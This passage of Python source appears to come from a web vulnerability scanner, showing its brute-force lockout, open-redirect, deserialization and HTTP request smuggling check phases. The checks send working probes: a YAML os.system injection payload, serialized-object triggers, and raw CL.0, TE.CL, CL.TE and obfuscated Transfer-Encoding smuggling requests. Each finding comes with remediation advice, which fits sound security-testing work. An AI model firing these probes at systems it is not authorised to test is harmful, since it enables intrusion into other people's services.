            # Baseline size match — if ALL probe responses are the same
            # size as the initial GET (±50 bytes) AND none contain an
            # auth-error phrase, the server likely did not process the
            # login (e.g. ASP.NET ignored POSTs with stale ViewState).
            if _baseline_size > 0:
                _all_match_baseline = all(
                    abs(len(r.content) - _baseline_size) < 50
                    for r in probe_responses
                )
                _no_err_text = not any(
                    _lockout_skip_phrases.search(
                        re.sub(r'<[^>]+>', ' ', (r.text or "")[:4000]))
                    for r in probe_responses
                )
                if _all_match_baseline and _no_err_text:
                    vc.log(
                        f"[account_lockout] All probe responses match baseline "
                        f"GET size ({_baseline_size}B ±50B) with no auth-error "
                        f"text — server did not process login attempts; "
                        "skipping finding to avoid false positive.",
                        "INFO",
                    )
                    continue

            # All 10 requests processed identically — collect for merged finding
            evidence_files: list = []
            for _ai, _ar in enumerate(probe_responses):
                try:
                    _rq, _rp = _save_http_evidence(
                        out, phase, f"brute_probe_{_ai + 1:02d}",
                        _ar, endpoint_url=action, method=method)
                    evidence_files.extend([_rq, _rp])
                except Exception:
                    pass
            # Validation summary for the output
            _val_signals = []
            if _auth_processing_confirmed:
                if any(re.search(r'<input[^>]+type=["\']?password["\']?',
                                 r.text or "", re.I) for r in probe_responses[:3]):
                    _val_signals.append("login form present in responses")
                if any(_lockout_skip_phrases.search(
                        re.sub(r'<[^>]+>', ' ', r.text[:4000] or ""))
                       for r in probe_responses[:3]):
                    _val_signals.append("auth-failure error text present")
                _val_signals.append("response stayed on login URL")
            _val_signals.append(f"no lockout phrases after {len(status_codes)} attempts")
            _val_signals.append("no CAPTCHA insertion detected")
            if probe_times:
                _val_signals.append(
                    f"no progressive delay (avg {sum(probe_times)/len(probe_times):.1f}s)")

            _lockout_results.append({
                "action": action,
                "method": method,
                "attempts": len(status_codes),
                "status_codes": status_codes,
                "probe_responses": probe_responses,
                "probe_times": probe_times,
                "evidence_files": evidence_files,
                "validation": _val_signals,
                "last_r": _last_r,
            })
            vc.log(f"[account_lockout] No lockout: {action} ({len(status_codes)} attempts)", "SUCCESS")

    # Emit ONE merged finding for all confirmed endpoints
    if _lockout_results:
        _all_ev: list = []
        _out_lines: list = []
        for _lr in _lockout_results:
            _out_lines.append(
                f"Endpoint: {_lr['action']}\n"
                f"  Method: {_lr['method']}  Attempts: {_lr['attempts']}\n"
                f"  Responses: " + ", ".join(
                    f"HTTP {r.status_code} ({len(r.content)}B, {_lr['probe_times'][i]:.1f}s)"
                    for i, r in enumerate(_lr['probe_responses'])
                    if i < len(_lr['probe_times'])
                ) + "\n"
                f"  Validation: " + "; ".join(_lr['validation'])
            )
            _all_ev.extend(_lr['evidence_files'])
        _affected = "\n".join(dict.fromkeys(r["action"] for r in _lockout_results))
        _first = _lockout_results[0]
        out.add_finding(
            title="Missing Rate Limiting / Brute-Force Protection",
            url=_first["action"], port=target["port"], risk="HIGH",
            description=(
                "Authentication endpoints do not enforce request rate limits, "
                "account lockout, CAPTCHA, or progressive delays, allowing "
                "unlimited brute-force or credential-stuffing attempts.  "
                f"{len(_lockout_results)} endpoint(s) confirmed."
            ),
            output="\n\n".join(_out_lines)[:3000],
            output_file=",".join(_all_ev),
            sources="fracture-account-lockout", service=target["scheme"],
            affected=_affected,
            owasp="A07:2025 Identification and Authentication Failures", nist="AC-7",
            remediation=(
                "Implement per-IP and per-account rate limiting with progressive "
                "delays or lockout on all authentication endpoints; add CAPTCHA "
                "for interactive login flows; alert on anomalous request volumes."
            ),
            http_code=_first["last_r"].status_code if _first["last_r"] else 0,
        )

    vc.status(phase, "Account Lockout", "complete", "Done", 3, 3)
    vc.log("[account_lockout] Phase complete", "SUCCESS")


# =============================================================================
# Phase 16: Open Redirect
# =============================================================================

def _phase_open_redirect(target: dict, cfg: dict, pm: ProgressManager,
                         out: OutputManager, sess: requests.Session,
                         crawl_data: dict) -> None:
    """Phase 16: Open redirect testing on URL-like parameters."""
    phase   = "open_redirect"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    params  = crawl_data.get("params", [])
    vc.status(phase, "Open Redirect", "running", "Testing redirect params", 0, 1)

    redir_params = [
        (e["url"], p) for e in params for p in e["params"]
        if p.lower().replace("-", "").replace("_", "") in _OPEN_REDIRECT_PARAMS
    ]
    _found: set = set()

    for purl, param in redir_params:
        if purl in _found:
            continue
        for payload in _OPEN_REDIRECT_PAYLOADS:
            try:
                r = _qs_inject(purl, param, payload, sess, timeout)
                if r is None:
                    continue
                # Check Location header (3xx) or meta-refresh / body reflection
                loc = r.headers.get("Location", "") if r.status_code in (301, 302, 303, 307, 308) else ""
                if _OPEN_REDIRECT_EXTERNAL_RE.search(loc) or \
                        _OPEN_REDIRECT_EXTERNAL_RE.search(r.text[:3000]):
                    _found.add(purl)
                    _redir_ev = ""
                    try:
                        _redir_rq, _redir_rp = _save_http_evidence(
                            out, phase, f"open_redirect_{param}", r)
                        _redir_ev = json.dumps(
                            [{"url": purl, "req": str(_redir_rq), "resp": str(_redir_rp)}])
                    except Exception:
                        pass
                    out.add_finding(
                        title="Open Redirect",
                        url=purl, port=target["port"], risk="MEDIUM",
                        description=(f"Open redirect via parameter '{param}' at {purl}. "
                                     f"Payload '{payload}' caused a redirect to an external domain. "
                                     f"An attacker can craft a trusted-looking URL that silently "
                                     f"redirects users to a phishing or malware site."),
                        output=(f"Parameter: {param}\nPayload: {payload}\n"
                                f"Response: HTTP {r.status_code}\nLocation: {loc or '(in body)'}"),
                        sources="fracture-open-redirect", service=target["scheme"],
                        output_file=_redir_ev,
                        affected=purl, owasp="A01:2025 Broken Access Control", nist="SC-7",
                        remediation=(
                            "Validate redirect destinations against an allowlist of trusted domains. "
                            "Never use raw user input as a redirect target."
                        ),
                    )
                    vc.log(f"[open_redirect] Open redirect: {purl} param={param}", "SUCCESS")
                    break
            except Exception:
                pass

    vc.status(phase, "Open Redirect", "complete", "Done", 1, 1)
    vc.log("[open_redirect] Phase complete", "SUCCESS")


# =============================================================================
# Phase 17: Deserialization Detection
# =============================================================================

def _phase_deserialization(target: dict, cfg: dict, pm: ProgressManager,
                           out: OutputManager, sess: requests.Session,
                           crawl_data: dict) -> None:
    """Phase 17: Detect insecure deserialization endpoints and patterns."""
    phase   = "deserialization"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    vc.status(phase, "Deserialization", "running", "Error pattern check", 0, 3)

    # 1. Trigger errors that reveal deserialization stack traces
    _deser_triggers = [
        b"rO0AB",          # Java serialized object base64 prefix
        b"gASV",           # Python pickle base64 prefix
        b"!!python/object", # YAML Python tag
        b"---\n!!",        # YAML prefix
    ]
    for form in forms[:10]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname or not _DESER_FIELD_RE.search(pname):
                continue
            for trigger in _deser_triggers:
                try:
                    import base64 as _b64d
                    encoded = _b64d.b64encode(trigger).decode()
                    data = {i["name"]: "test" for i in inputs if i.get("name")}
                    data[pname] = encoded
                    r = sess.post(action, data=data, timeout=timeout)
                    if r and _DESER_RESP_RE.search(r.text):
                        _rq, _rp = _save_http_evidence(out, phase, f"deser_error_{pname}", r)
                        out.add_finding(
                            title="Insecure Deserialization — Error Disclosure",
                            url=action, port=target["port"], risk="HIGH",
                            description=(f"Field '{pname}' at {action} returned an error message "
                                         f"revealing deserialization stack trace or library details. "
                                         f"This indicates the application deserialises user-controlled input."),
                            output=f"Field: {pname}\nPayload: {encoded[:40]}\nResponse: {r.text[:500]}",
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-deserialization", service=target["scheme"],
                            affected=action, owasp="A08:2025 Software and Data Integrity Failures",
                            nist="SI-7",
                            remediation=(
                                "Avoid deserialising untrusted data. Use safe formats (JSON, Protobuf). "
                                "If deserialization is required, implement integrity checks and input validation."
                            ),
                        )
                        vc.log(f"[deserialization] Error discloses deserializer at {action}", "SUCCESS")
                        break
                except Exception:
                    pass

    vc.status(phase, "Deserialization", "running", "Content-Type probe", 1, 3)
    # 2. Probe common endpoints with serialized content-types
    for ct in _DESER_CONTENT_TYPES:
        try:
            r = sess.post(url, data=b"\xac\xed\x00\x05", timeout=timeout,
                          headers={"Content-Type": ct})
            if r and _DESER_RESP_RE.search(r.text):
                _ct_safe = re.sub(r'[^\w]', '_', ct)[:20]
                _rq, _rp = _save_http_evidence(out, phase, f"deser_ct_{_ct_safe}", r)
                out.add_finding(
                    title="Insecure Deserialization — Serialized Object Accepted",
                    url=url, port=target["port"], risk="CRITICAL",
                    description=(f"The endpoint accepted a POST request with Content-Type '{ct}' "
                                 f"and the response suggests the payload was processed by a "
                                 f"deserialization library. Insecure deserialization can lead to RCE."),
                    output=f"POST {url} with Content-Type: {ct}\nResponse: {r.text[:500]}",
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-deserialization", service=target["scheme"],
                    affected=url, owasp="A08:2025 Software and Data Integrity Failures",
                    nist="SI-7",
                    remediation=(
                        "Reject requests with serialization content-types unless explicitly required. "
                        "Use integrity-checked, schema-validated formats."
                    ),
                )
                vc.log(f"[deserialization] Serialized CT accepted: {ct}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Deserialization", "running", "YAML deserialization probe", 2, 3)
    # 3. YAML deserialization probe via form fields and API endpoints
    _yaml_payload = "!!python/object/apply:os.system ['echo fracture_yaml_rce']"
    for form in forms[:5]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname:
                continue
            data = {i["name"]: "test" for i in inputs if i.get("name")}
            data[pname] = _yaml_payload
            try:
                r = sess.post(action, data=data, timeout=timeout)
                # Strip payload reflections before checking for the
                # execution marker — same false-positive risk as code
                # injection: some apps echo POST field values back.
                _yaml_body = r.text
                for _enc in (_yaml_payload,
                             urllib.parse.quote(_yaml_payload),
                             urllib.parse.quote_plus(_yaml_payload)):
                    _yaml_body = _yaml_body.replace(_enc, "")
                if (re.search(r'fracture_yaml_rce|yaml.*error|unsafe.*load', _yaml_body, re.I)
                          or r.status_code == 500):
                    _rq, _rp = _save_http_evidence(out, phase, f"deser_yaml_{pname}", r)
                    out.add_finding(
                        title="Insecure Deserialization — YAML Tag Injection",
                        url=action, port=target["port"], risk="CRITICAL",
                        description=(f"Field '{pname}' at {action} accepted a YAML tag injection payload "
                                     f"({_yaml_payload!r}). The response indicates YAML parsing of the input."),
                        output=f"Field: {pname}\nPayload: {_yaml_payload}\nResponse ({r.status_code}): {r.text[:400]}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-deserialization", service=target["scheme"],
                        affected=action, owasp="A08:2025 Software and Data Integrity Failures",
                        nist="SI-7",
                        remediation="Use yaml.safe_load() instead of yaml.load(). Never pass user input to YAML parsers that process Python tags.",
                    )
                    vc.log(f"[deserialization] YAML tag injection at {action}", "SUCCESS")
                    break
            except Exception:
                pass

    vc.status(phase, "Deserialization", "complete", "Done", 3, 3)
    vc.log("[deserialization] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 17b: HTTP Request Smuggling / Client-Side Desync
# ─────────────────────────────────────────────
# CWE-444: Inconsistent Interpretation of HTTP Requests
# References:
#   PortSwigger — HTTP Request Smuggling
#   PortSwigger — Browser-Powered Desync Attacks (CSD)
#   RFC 9112 §6.3 — Message Body Length

def _phase_request_smuggling(target: dict, cfg: dict, pm: ProgressManager,
                              out: OutputManager, sess: requests.Session,
                              crawl_data: dict) -> None:
    """Phase 17b: HTTP Request Smuggling and Client-Side Desync detection.

    Tests for CL.0 (client-side desync), TE.CL, and CL.TE smuggling using
    raw sockets with two-phase detection: differential timing probe, then
    verified confirmation with a smuggled canary.
    """
    import socket as _sock, ssl as _ssl2, select as _sel2

    phase    = "request_smuggling"
    url      = target["url"]
    hostname = target["hostname"]
    port     = target["port"]
    scheme   = target["scheme"]
    timeout  = cfg.get("timeout", 10)
    use_tls  = scheme == "https"
    parsed   = urllib.parse.urlparse(url)
    base_path = parsed.path or "/"

    vc.status(phase, "Request Smuggling", "running", "Initializing", 0, 4)

    # ── Helpers ───────────────────────────────────────────────────────────

    def _raw_connect(connect_timeout=None):
        ct = connect_timeout or timeout
        sock = _sock.create_connection((hostname, port), timeout=ct)
        sock.settimeout(None)
        if use_tls:
            ctx = _ssl2.create_default_context()
            if not cfg.get("verify_ssl", False):
                ctx.check_hostname = False
                ctx.verify_mode = _ssl2.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=hostname)
        return sock

    def _recv(sock, max_wait=5.0):
        """Read until headers + short body window or timeout."""
        buf = b""
        deadline = time.time() + max_wait
        while time.time() < deadline:
            rem = max(deadline - time.time(), 0.05)
            ready = _sel2.select([sock], [], [], min(rem, 1.0))
            if not ready[0]:
                if buf:
                    break
                continue
            try:
                chunk = sock.recv(8192)
            except (_sock.error, _ssl2.SSLError, OSError):
                break
            if not chunk:
                break
            buf += chunk
            if b"\r\n\r\n" in buf:
                _tail_deadline = time.time() + 0.5
                while time.time() < _tail_deadline:
                    r2 = _sel2.select([sock], [], [], 0.3)
                    if not r2[0]:
                        break
                    try:
                        c2 = sock.recv(8192)
                    except (_sock.error, _ssl2.SSLError, OSError):
                        break
                    if not c2:
                        break
                    buf += c2
                break
        return buf

    def _status(raw: bytes) -> int:
        try:
            return int(raw.split(b"\r\n")[0].split()[1])
        except (IndexError, ValueError):
            return 0

    def _keepalive(raw: bytes) -> bool:
        lo = raw.lower()
        if b"connection: close" in lo:
            return False
        if raw.startswith(b"HTTP/1.1") or b"connection: keep-alive" in lo:
            return True
        return False

    def _close(sock):
        try:
            sock.close()
        except Exception:
            pass

    _cookies = "; ".join(f"{c.name}={c.value}" for c in sess.cookies)
    _ck = f"Cookie: {_cookies}\r\n" if _cookies else ""

    _baseline_code = 0
    try:
        _bl = sess.get(url, timeout=timeout, allow_redirects=False)
        _baseline_code = _bl.status_code
    except Exception:
        pass

    _test_paths = [base_path]
    for _f in crawl_data.get("forms", [])[:5]:
        _a = _f.get("action", "")
        if _a:
            _p = urllib.parse.urlparse(_a).path
            if _p and _p not in _test_paths:
                _test_paths.append(_p)

    def _save_smuggle_evidence(label: str, content: str) -> str:
        """Write evidence text; return run-dir-relative path or empty."""
        try:
            d = out.root / phase
            d.mkdir(parents=True, exist_ok=True)
            _safe_label = re.sub(r'[^a-zA-Z0-9_]', '_', label)[:50]
            fp = d / f"{_safe_label}.txt"
            fp.write_text(content)
            return str(fp.relative_to(out.root))
        except Exception:
            return ""

    # ── Test 1: CL.0 / Client-Side Desync ─────────────────────────────────
    # POST with body containing a smuggled GET.  If the server responds
    # before consuming the body and keeps the connection alive, the smuggled
    # request may be interpreted as the next request on the connection.
    vc.status(phase, "Request Smuggling", "running", "CL.0 client-side desync", 1, 4)
    vc.log("[request_smuggling] Testing CL.0 / client-side desync", "INFO")

    _cl0_found = False
    _canary_tag = f"_fr_smug_{int(time.time()) % 99999}"
    _canary_path = f"/{_canary_tag}"

    for _tp in _test_paths[:4]:
        if _cl0_found:
            break
        sock = None
        try:
            sock = _raw_connect()
            smuggled = (
                f"GET {_canary_path} HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"\r\n"
            ).encode()
            post_hdr = (
                f"POST {_tp} HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"{_ck}"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(smuggled)}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            ).encode()

            # Send POST headers only — no body yet
            sock.sendall(post_hdr)

            # Wait for early response (precondition: server responds before body)
            early = b""
            if _sel2.select([sock], [], [], 3)[0]:
                early = _recv(sock, max_wait=3)

            if not early or b"HTTP/1." not in early or not _keepalive(early):
                _close(sock)
                continue

            # Precondition met: send body (smuggled request)
            try:
                sock.sendall(smuggled)
            except (_sock.error, _ssl2.SSLError, BrokenPipeError, OSError):
                _close(sock)
                continue

            time.sleep(0.3)

            # Follow-up GET on the same connection
            followup = (
                f"GET {base_path} HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"{_ck}"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            fu_resp = b""
            try:
                sock.sendall(followup)
                fu_resp = _recv(sock, max_wait=5)
            except (_sock.error, _ssl2.SSLError, BrokenPipeError, OSError):
                pass
            _close(sock)
            sock = None

            if not fu_resp:
                continue

            fu_code = _status(fu_resp)
            detail = ""
            if _canary_tag.encode() in fu_resp:
                detail = (f"Follow-up response contains smuggled canary "
                          f"path '{_canary_path}'")
            elif fu_code == 404 and _baseline_code and _baseline_code != 404:
                detail = (f"Follow-up GET {base_path} → 404 "
                          f"(expected {_baseline_code}); server processed "
                          f"smuggled GET {_canary_path}")
            elif fu_code == 400 and _baseline_code and _baseline_code != 400:
                detail = (f"Follow-up GET {base_path} → 400 "
                          f"(expected {_baseline_code}); desynchronised")

            if detail:
                _cl0_found = True
                ev = _save_smuggle_evidence(
                    f"cl0_{_tp}",
                    f"=== CL.0 Client-Side Desync Evidence ===\n"
                    f"Target path: {_tp}\n"
                    f"Verification: {detail}\n\n"
                    f"--- POST (headers only, no body) ---\n"
                    f"{post_hdr.decode(errors='replace')}\n"
                    f"--- Early response ---\n"
                    f"{early.decode(errors='replace')[:800]}\n\n"
                    f"--- Smuggled body ---\n"
                    f"{smuggled.decode(errors='replace')}\n\n"
                    f"--- Follow-up response (HTTP {fu_code}) ---\n"
                    f"{fu_resp.decode(errors='replace')[:800]}\n")
                out.add_finding(
                    title="HTTP Request Smuggling — CL.0 Client-Side Desync",
                    url=url, port=port, risk="HIGH",
                    description=(
                        f"A CL.0 client-side desync was confirmed at '{_tp}'. The "
                        f"server responded to a POST before consuming the body and "
                        f"kept the connection alive, allowing a smuggled request to "
                        f"be interpreted as the next pipelined request. An attacker "
                        f"can exploit this via a victim's browser to hijack "
                        f"connections, enabling XSS, credential theft, or web cache "
                        f"poisoning.\n\nVerification: {detail}"),
                    output=(
                        f"POST {_tp} → early response HTTP {_status(early)}, "
                        f"keep-alive\n"
                        f"Smuggled: GET {_canary_path}\n"
                        f"Follow-up: GET {base_path} → HTTP {fu_code} "
                        f"(expected {_baseline_code})\n{detail}"),
                    output_file=ev,
                    sources="fracture-smuggling", service=scheme,
                    affected=_tp, cves="",
                    owasp="A08:2025 Software and Data Integrity Failures",
                    nist="SI-10",
                    remediation=(
                        "Ensure the server fully consumes POST request bodies "
                        "before responding, or closes the connection after the "
                        "response. Enable HTTP/2 end-to-end. Configure reverse "
                        "proxies to normalise Content-Length handling and reject "
                        "ambiguous requests."),
                )
                vc.log(f"[request_smuggling] CL.0 CONFIRMED at {_tp}: {detail}",
                       "SUCCESS")
        except Exception as _e:
            vc.log(f"[request_smuggling] CL.0 probe error on {_tp}: {_e}",
                   "WARNING")
        finally:
            if sock:
                _close(sock)

    if not _cl0_found:
        vc.log("[request_smuggling] No CL.0 desync detected", "INFO")

    # ── Test 2: TE.CL Smuggling ─────────────────────────────────────────
    # Front-end uses Transfer-Encoding, back-end uses Content-Length.
    # Phase A: timing probe — an incomplete chunk causes the TE side to
    #          wait for more data (timeout), while a CL side responds fast.
    # Phase B: smuggled prefix — leftover bytes after the CL boundary
    #          corrupt the next request.
    vc.status(phase, "Request Smuggling", "running", "TE.CL smuggling", 2, 4)
    vc.log("[request_smuggling] Testing TE.CL differential", "INFO")

    _tecl_found = False
    for _tp in _test_paths[:2]:
        if _tecl_found:
            break
        sock = None
        try:
            # Phase A: timing probe
            sock = _raw_connect()
            timing_req = (
                f"POST {_tp} HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"{_ck}"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Content-Length: 4\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"1\r\n"
                f"Z\r\n"
                f"Q"
            ).encode()
            t0 = time.time()
            sock.sendall(timing_req)
            timing_resp = _recv(sock, max_wait=6)
            dt = time.time() - t0
            _close(sock)
            sock = None

            # Quick response (< 2 s) ⇒ server used CL; slow/timeout ⇒ TE.
            if dt < 3.0 and timing_resp:
                vc.log(f"[request_smuggling] TE.CL timing: fast response "
                       f"({dt:.1f}s) — server likely uses CL, not TE", "INFO")
                continue

            vc.log(f"[request_smuggling] TE.CL timing: {dt:.1f}s delay — "
                   f"server may use TE on front-end", "INFO")

            # Phase B: confirm with smuggled prefix.
            # Body: "0\r\n\r\nG"  (6 bytes).
            # TE parser: reads "0\r\n\r\n" → end of chunks.
            # CL parser (CL=6): reads all 6 bytes → body done, but "G" is
            # the 6th byte inside the body.  However, if the front-end (TE)
            # forwarded all raw bytes to the backend (CL=6), the backend
            # consumes "0\r\n\r\nG" as body.  The leftover starts from the
            # follow-up.  That alone doesn't smuggle.
            #
            # Correct TE.CL: CL must be SHORTER than the TE body so leftovers
            # exist after the CL boundary on the backend.
            #   TE body: chunk "1\r\nG\r\n" + terminator "0\r\n\r\n"
            #   CL = 3  → backend reads "1\r\n" (3 bytes), leftover = "G\r\n0\r\n\r\n"
            sock = _raw_connect()
            smug_body = "1\r\nG\r\n0\r\n\r\n"
            confirm_req = (
                f"POST {_tp} HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"{_ck}"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Content-Length: 3\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{smug_body}"
            ).encode()
            sock.sendall(confirm_req)
            resp1 = _recv(sock, max_wait=5)
            if resp1 and _keepalive(resp1):
                followup = (
                    f"GET {base_path} HTTP/1.1\r\n"
                    f"Host: {hostname}\r\n"
                    f"{_ck}"
                    f"Connection: close\r\n"
                    f"\r\n"
                ).encode()
                resp2 = b""
                try:
                    sock.sendall(followup)
                    resp2 = _recv(sock, max_wait=5)
                except (_sock.error, _ssl2.SSLError, BrokenPipeError, OSError):
                    pass

                if resp2:
                    code2 = _status(resp2)
                    if (code2 in (400, 405)
                            and _baseline_code
                            and _baseline_code not in (400, 405)):
                        _tecl_found = True
                        ev = _save_smuggle_evidence(
                            f"tecl_{_tp}",
                            f"=== TE.CL Smuggling Evidence ===\n"
                            f"Target: {_tp}\n"
                            f"Timing delay: {dt:.1f}s\n\n"
                            f"--- Smuggling request ---\n"
                            f"{confirm_req.decode(errors='replace')}\n\n"
                            f"--- Response 1 ---\n"
                            f"{resp1.decode(errors='replace')[:800]}\n\n"
                            f"--- Follow-up response (HTTP {code2}) ---\n"
                            f"{resp2.decode(errors='replace')[:800]}\n")
                        out.add_finding(
                            title="HTTP Request Smuggling — TE.CL Desync",
                            url=url, port=port, risk="CRITICAL",
                            description=(
                                f"A TE.CL request smuggling vulnerability was confirmed "
                                f"at '{_tp}'. The front-end processes Transfer-Encoding: "
                                f"chunked while the back-end processes Content-Length, "
                                f"allowing an attacker to smuggle arbitrary requests "
                                f"through the front-end proxy. This enables request "
                                f"hijacking, web cache poisoning, credential theft, and "
                                f"potential RCE via chained attacks.\n\n"
                                f"Follow-up GET {base_path} → HTTP {code2} "
                                f"(expected {_baseline_code})."),
                            output=(
                                f"Timing: {dt:.1f}s (front-end uses TE)\n"
                                f"POST {_tp} with TE + CL=3 (disagreement)\n"
                                f"Follow-up: GET {base_path} → HTTP {code2} "
                                f"(expected {_baseline_code})"),
                            output_file=ev,
                            sources="fracture-smuggling", service=scheme,
                            affected=_tp, cves="",
                            owasp="A08:2025 Software and Data Integrity Failures",
                            nist="SI-10",
                            remediation=(
                                "Reject requests carrying both Transfer-Encoding and "
                                "Content-Length (RFC 9112 §6.3). Enable HTTP/2 "
                                "end-to-end. Ensure all proxy layers agree on body "
                                "length semantics."),
                        )
                        vc.log(f"[request_smuggling] TE.CL CONFIRMED at {_tp}",
                               "SUCCESS")
            _close(sock)
            sock = None
        except Exception as _e:
            vc.log(f"[request_smuggling] TE.CL error on {_tp}: {_e}", "WARNING")
        finally:
            if sock:
                _close(sock)

    if not _tecl_found:
        vc.log("[request_smuggling] No TE.CL smuggling detected", "INFO")

    # ── Test 3: CL.TE Smuggling ─────────────────────────────────────────
    # Front-end uses Content-Length, back-end uses Transfer-Encoding.
    vc.status(phase, "Request Smuggling", "running", "CL.TE smuggling", 3, 4)
    vc.log("[request_smuggling] Testing CL.TE differential", "INFO")

    _clte_found = False
    for _tp in _test_paths[:2]:
        if _clte_found:
            break
        sock = None
        try:
            # Phase A: timing probe.
            # CL=0 + TE:chunked with no terminator.
            # CL front-end reads 0 bytes → responds immediately.
            # TE front-end waits for chunk terminator → timeout.
            sock = _raw_connect()
            timing_req = (
                f"POST {_tp} HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"{_ck}"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 0\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            ).encode()
            t0 = time.time()
            sock.sendall(timing_req)
            timing_resp = _recv(sock, max_wait=6)
            dt = time.time() - t0
            _close(sock)
            sock = None

            if dt > 3.0 or not timing_resp:
                vc.log(f"[request_smuggling] CL.TE timing: slow/no response "
                       f"({dt:.1f}s) — server likely uses TE, not CL", "INFO")
                continue

            vc.log(f"[request_smuggling] CL.TE timing: fast ({dt:.1f}s) — "
                   f"server may use CL on front-end", "INFO")

            # Phase B: CL.TE confirm.
            # CL = total bytes of the body we actually send.
            # The TE back-end reads chunks.  We embed a smuggled prefix
            # inside a chunk that the CL front-end forwards blindly.
            sock = _raw_connect()
            smuggled_prefix = "G"
            chunked_body = f"1\r\n{smuggled_prefix}\r\n0\r\n\r\n"
            confirm_req = (
                f"POST {_tp} HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"{_ck}"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(chunked_body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{chunked_body}"
            ).encode()
            sock.sendall(confirm_req)
            resp1 = _recv(sock, max_wait=5)

            if resp1 and _keepalive(resp1):
                followup = (
                    f"GET {base_path} HTTP/1.1\r\n"
                    f"Host: {hostname}\r\n"
                    f"{_ck}"
                    f"Connection: close\r\n"
                    f"\r\n"
                ).encode()
                resp2 = b""
                try:
                    sock.sendall(followup)
                    resp2 = _recv(sock, max_wait=5)
                except (_sock.error, _ssl2.SSLError, BrokenPipeError, OSError):
                    pass

                if resp2:
                    code2 = _status(resp2)
                    if (code2 in (400, 405)
                            and _baseline_code
                            and _baseline_code not in (400, 405)):
                        _clte_found = True
                        ev = _save_smuggle_evidence(
                            f"clte_{_tp}",
                            f"=== CL.TE Smuggling Evidence ===\n"
                            f"Target: {_tp}\n"
                            f"Timing delay: {dt:.1f}s\n\n"
                            f"--- Smuggling request ---\n"
                            f"{confirm_req.decode(errors='replace')}\n\n"
                            f"--- Response 1 ---\n"
                            f"{resp1.decode(errors='replace')[:800]}\n\n"
                            f"--- Follow-up response (HTTP {code2}) ---\n"
                            f"{resp2.decode(errors='replace')[:800]}\n")
                        out.add_finding(
                            title="HTTP Request Smuggling — CL.TE Desync",
                            url=url, port=port, risk="CRITICAL",
                            description=(
                                f"A CL.TE request smuggling vulnerability was confirmed "
                                f"at '{_tp}'. The front-end processes Content-Length "
                                f"while the back-end processes Transfer-Encoding: "
                                f"chunked, allowing request smuggling.\n\n"
                                f"Follow-up GET {base_path} → HTTP {code2} "
                                f"(expected {_baseline_code})."),
                            output=(
                                f"Timing: {dt:.1f}s (front-end uses CL)\n"
                                f"POST {_tp} with CL={len(chunked_body)} + TE:chunked\n"
                                f"Follow-up: GET {base_path} → HTTP {code2} "
                                f"(expected {_baseline_code})"),
                            output_file=ev,
                            sources="fracture-smuggling", service=scheme,
                            affected=_tp, cves="",
                            owasp="A08:2025 Software and Data Integrity Failures",
                            nist="SI-10",
                            remediation=(
                                "Reject requests carrying both Transfer-Encoding and "
                                "Content-Length. Enable HTTP/2 end-to-end. Normalise "
                                "request processing across all proxy layers."),
                        )
                        vc.log(f"[request_smuggling] CL.TE CONFIRMED at {_tp}",
                               "SUCCESS")
            _close(sock)
            sock = None
        except Exception as _e:
            vc.log(f"[request_smuggling] CL.TE error on {_tp}: {_e}", "WARNING")
        finally:
            if sock:
                _close(sock)

    if not _clte_found:
        vc.log("[request_smuggling] No CL.TE smuggling detected", "INFO")

    # ── Test 4: Transfer-Encoding obfuscation ─────────────────────────────
    # Some proxies only recognise the canonical "chunked" token.  Obfuscated
    # TE headers (extra whitespace, capitalisation, line folding) may be
    # ignored by one layer but honoured by another, creating a differential.
    _te_variants = (
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: x\r\nTransfer-Encoding: chunked",
    )
    _te_obfusc_found = False
    for _te_hdr in _te_variants:
        if _te_obfusc_found:
            break
        sock = None
        try:
            sock = _raw_connect()
            probe = (
                f"POST {base_path} HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"{_ck}"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 3\r\n"
                f"{_te_hdr}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"1\r\nG\r\n0\r\n\r\n"
            ).encode()
            sock.sendall(probe)
            resp1 = _recv(sock, max_wait=5)
            if resp1 and _keepalive(resp1):
                followup = (
                    f"GET {base_path} HTTP/1.1\r\n"
                    f"Host: {hostname}\r\n"
                    f"{_ck}"
                    f"Connection: close\r\n"
                    f"\r\n"
                ).encode()
                resp2 = b""
                try:
                    sock.sendall(followup)
                    resp2 = _recv(sock, max_wait=5)
